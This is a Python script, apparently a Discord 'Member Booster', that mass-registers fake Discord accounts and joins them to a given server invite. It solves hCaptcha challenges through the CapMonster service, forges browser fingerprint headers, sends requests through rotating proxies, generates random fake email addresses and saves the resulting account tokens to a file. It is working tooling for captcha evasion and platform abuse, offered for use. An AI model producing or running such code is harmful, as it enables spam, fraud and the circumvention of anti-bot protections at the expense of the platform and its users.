import time, sys, re

def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests, capmonster_python
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests capmonster-python")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()
    
    


import json
import threading
import time
import random
import os




try:
    import os
    os.system("title " + "Discord Account Creator,   Made By Federal#6666")
except:
    pass

def we():
    global elr
    if elr == False:
        elr = True
        os.system("cls")

colorama.init(autoreset=True)
def settings():
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print015("Loading Settings...")
        time.sleep(0.5)
        error = False
        global elr
        elr = False
        try:
            global api_key, password, proxy
            json_data = open("settings.json", "r")
            json_data = json.load(json_data)
            api_key = json_data["capmonster_key"]
            password = json_data["tokens_password"]
            proxy = json_data["rotating_proxy"]
            try:
                bal = capmonster_python.HCaptchaTask(api_key)
                el = bal.get_balance()
                if float(el) == 0:
                    error = True
                    we()
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print015("More Than 0$ Needed In The Capmonster Key")
            except Exception as er:
                error = True
                we()
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Could Not Connect To The Capmonster Key")


            if len(password) < 8:
                we()
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Password Must Be At Least 8 Characters Long")
                error = True
            
            try:
                with open("names.txt", "r") as file:
                    pass
            except:
                error = True
                we()
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015('Missing "names.txt"')
            


            try:
                requests.get("https://google.com", proxies={"https": proxy, "http": proxy})
            except:
                error = True
                we()
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Could Not Connect To Proxy")

            if proxy == "":
                error = True
                we()
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Could Not Connect To Proxy")

            if error == True:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print01("Press Enter When You Have Fixed Settings And All Settings Will Reload")
                input("")
                print("")
            if error == False:
                break
        except Exception as e:
            we()
            sys.stdout.write(colorama.Fore.RED + "> ")
            print01('Missing "settings.json" File, It Stores All Settings')
            input("")
            exit()




settings()
os.system("cls")

cap = capmonster_python.HCaptchaTask(api_key)
choicess = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

with open("names.txt", "r") as file:
    names = file.readlines()


def gen():
    global lest
    try:
        while True:
            session = requests.session()
            tt = cap.create_task("https://discord.com/register", "4c672d35-0701-42b2-88c3-78380b0db560")
            lest.append("Created Captcha Task, "+str(tt))
            captcha = cap.join_task_result(tt)
            lest.append("Solved Captcha")
            captcha = str(captcha.get("gRecaptchaResponse"))
            session.headers["X-Fingerprint"] = session.get("https://discord.com/api/v9/experiments").json()["fingerprint"]
            Fingerprint = session.headers["X-Fingerprint"]


            session.headers = {'Host': 'discord.com', 'Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IEVkZy85My4wLjk2MS40NyIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAuNDU3Ny42MyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy81NTQxMjU3Nzc4MTg2MTU4NDQvODcwODgxOTEyMzQyODUxNTk1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk3NTA3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==','Accept-Language': 'en-US', 'sec-ch-ua-mobile': '?0',"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",'Content-Type': 'application/json', 'Authorization': 'undefined','Accept': '*/*', 'Origin': 'https://discord.com','Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty', 'Referer': 'https://discord.com/register','X-Debug-Options': 'bugReporterEnabled','Accept-Encoding': 'gzip, deflate, br','Cookie': 'OptanonConsent=version=6.17.0; locale=th'}

            email = "".join(random.choices(choicess, k=16))
            lest.append("Generated Email")
            if nam == True:
                name = random.choice(names)
                if "\n" in name:
                    name = name[:-1]
                
            if nam != True:
                name = nam + " | " + "".join(random.choices(choicess, k=5))
            lest.append("Loaded Username")
            payload = {
                "fingerprint": Fingerprint,
                "email": f"{email}@gmail.com",
                "username": name,
                "password": password,
                "invite": invite_code,
                "consent": True,
                "date_of_birth": "2003-11-18",
                "gift_code_sku_id": None,
                "captcha_key": captcha,
                "promotional_email_opt_in": True
            }
            while True:
                session.proxies = {
                    "http": proxy,
                    "https": proxy
                }
                while True:
                    try:
                        reg = session.post('https://discord.com/api/v9/auth/register', json=payload)
                        break
                    except:
                        pass
                res = str(reg)
                jle = reg.json()
                if "201" in res:
                    token = str(jle["token"])
                    file = open("tokens.txt", "a")
                    file.write(token+"\n")
                    file.close()
                    token1 = token[:len(token)//2]
                    for u in range(int(len(token1))):
                        token1 = str(token1) + "*"
                    lest.append(f"Generated Token, {token1}")
                    break
    except Exception as e:
        lest.append("Unknown Error")



def clear():
    os.system("cls")

lest = []

while True:
    os.system("cls")
    sys.stdout.write(colorama.Fore.CYAN + "1. ")
    print015("Member Booster")
    sys.stdout.write(colorama.Fore.CYAN + "2. ")
    print015("Check Capmonster Balance")
    sys.stdout.write(colorama.Fore.CYAN + "3. ")
    print015("Reload Settings")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    tools = input("")
    if tools == "3":
        os.system("cls")
        settings()
        os.system("cls")
    if tools == "2":
        clear()
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015("Getting Capmonster Balance...")
            balance = cap.get_balance()
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print015(f"Capmonster Balance: {str(balance)}$")
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Invalid Capmonster Key, Press Enter To Exit The Program")
            input("")
            exit()
        input("")
        os.system("cls")
    








    if tools == "1":
        os.system("cls")
        while True:
            try:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print01("Amount Of Threads: ")
                threads = int(input(""))
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Enter An Number")


        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Invite Code (discord.gg/*****): ")
            invite_code = input("")
            re1 = requests.get(f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true&with_expiration=true")
            if "200" in str(re1):
                break
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Invalid Invite Or Rate Limited")


        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01('Enter Name Of Accounts, Type "random" To Use Random Names From "names.txt": ')
            nam = input("")
            nam = re.sub(r'[^a-zA-Z0-9./]', '', nam)
            if nam == "random":
                nam = True
                break
            if len(nam) <=2:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("At Least 3 Letters In The Name")
            else:
                break
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Press Enter To Start Member Booster: ")
        input("")
        os.system("cls")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Generating Accounts...")

        for u in range(int(threads)):
            threading.Thread(target=gen).start()
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Started Thread")

        while True:
            for u in lest:
                lest.remove(u)
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(u)
        

